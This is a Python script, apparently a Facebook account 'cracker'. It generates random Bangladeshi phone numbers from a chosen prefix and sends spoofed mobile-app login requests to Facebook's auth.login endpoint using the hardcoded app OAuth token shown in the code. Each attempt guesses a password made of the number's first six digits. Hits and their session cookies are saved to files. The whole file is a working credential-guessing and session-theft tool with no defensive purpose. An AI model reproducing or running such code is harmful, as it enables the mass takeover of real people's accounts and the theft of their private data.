import os, random, string, sys, uuid, json, requests
from concurrent.futures import ThreadPoolExecutor as Executor

#___________MAIN___________#
class FacebookCracker:
    def __init__(self):
        self.loop = 0
        self.user = []
        self.ok = []

    #__________LOGO____________#
    def flash(self):
        os.system('clear')
        print(self.logo())

    #__________UA____________#
    def generate_ua(self):
        vivocode = random.choice(["1906", "1814", "1820", "1812", "1920", "1904", "1811", "1901", "2015", "2004", "1610", "1609", "1601"])
        mobileversion = random.choice(["7", "8", "9", "10", "11"])
        ua = (
            f"[FBAN/FB4A;FBAV/{random.randint(11, 77)}.0.0."
            f"{random.randrange(9, 49)}{random.randint(11, 77)};"
            f"FBBV/{random.randint(1111111, 7777777)};"
            f"FBDM={{density=2.0,width=720,height=1406}};"
            f"FBLC/en_US;FBRV/{random.randint(111111111, 999999999)};"
            f"FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;"
            f"FBDV/vivo {vivocode};FBSV/{mobileversion};FBOP/1;FBCA/arm64-v8a:;]" )
        return ua
    #______________LINE_____________#
    @staticmethod
    def line():
        print(10 * '<=>')
    #____________LOGO__________#
    def logo(self):
        return '''\n      ▌ ▌▞▀▖▙▗▌▛▀▖▜▘▛▀▖▛▀▘\n      ▚▗▘▙▄▌▌▘▌▙▄▘▐ ▙▄▘▙▄\n      ▝▞ ▌ ▌▌ ▌▌  ▐ ▌▚ ▌\n       ▘ ▘ ▘▘ ▘▘  ▀▘▘ ▘▀▀▘\n<=><=><=><=><=><=><=><=><=><=>'''
    
    #____________MENU___________#
    def main_menu(self):
        self.flash()
        print(' [1] RANDOM ')
        print(' [2] EXIT ')
        self.line()
        choice = input(' CHOICE : ')
        if choice == '1':
            self.bangladesh()
        elif choice == '2':
            exit(' THANKS FOR USING DEAR ')
        else:
            exit(' SORRY YOU HAVE NOT SELECTED ANY OPTION ')

    #____________BD____________#
    def bangladesh(self):
        self.flash()
        print(' SIM CODE : 8394 / 6296 / 7481 ....ETC ')
        self.line()
        code = input(' CHOICE CODE : ')
        self.flash()
        print(' LIMIT EX : 1000 / 2000 ')
        self.line()
        limit = int(input(' LIMIT : '))
        self.flash()
        for _ in range(limit):
            nmp = ''.join(random.choice(string.digits) for _ in range(6))
            self.user.append(nmp)
        with Executor(max_workers=30) as executor:
            for sexy in self.user:
                uid = code + sexy
                paslist = [uid[:6]]
                executor.submit(self.method, uid, paslist)

    #_____________METHOD____________#
    def method(self, uid, paslist):
        sys.stdout.write(f'\r {self.loop}|OK:{len(self.ok)}'), sys.stdout.flush()
        for pxs in paslist:
            headers = {
                'User-Agent': self.generate_ua(),
                'Accept-Encoding': 'gzip, deflate', 
                'Accept': '*/*', 
                'Connection': 'keep-alive', 
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                'X-FB-Friendly-Name': 'authenticate', 
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
                'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                'X-FB-Connection-Type': 'unknown',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pxs,
                'generate_analytics_claims': '1', 
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false', 
                'generate_session_cookies': '1', 
                'generate_machine_id': '1', 
                'meta_inf_fbmeta': '', 
                'currently_logged_in_userid': '0', 
                'fb_api_req_friendly_name': 'authenticate'
            }
            print(headers)
            try:
                response = requests.post('https://api.facebook.com/method/auth.login', data=data, headers=headers).json()
                if 'session_key' in response:
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    print(f'\r [OK] => {uid}|{pxs}\n [COOKIE] => {coki}')
                    open('/sdcard/XD-OK.txt','a').write(uid+'|'+pxs+ ' | ' +coki+'\n')
                    self.ok.append(uid)
                    break
                elif 'www.facebook.com' in response['error']['message']:
                    print(f'\r [CP] => {uid}|{pxs}')
                    open('/sdcard/XD-CP.txt','a').write(uid+'|'+pxs+ '\n')
                    break
            except Exception:
                pass
        self.loop += 1

#____________CALL____________#
if __name__ == "__main__":
    app = FacebookCracker()
    app.main_menu()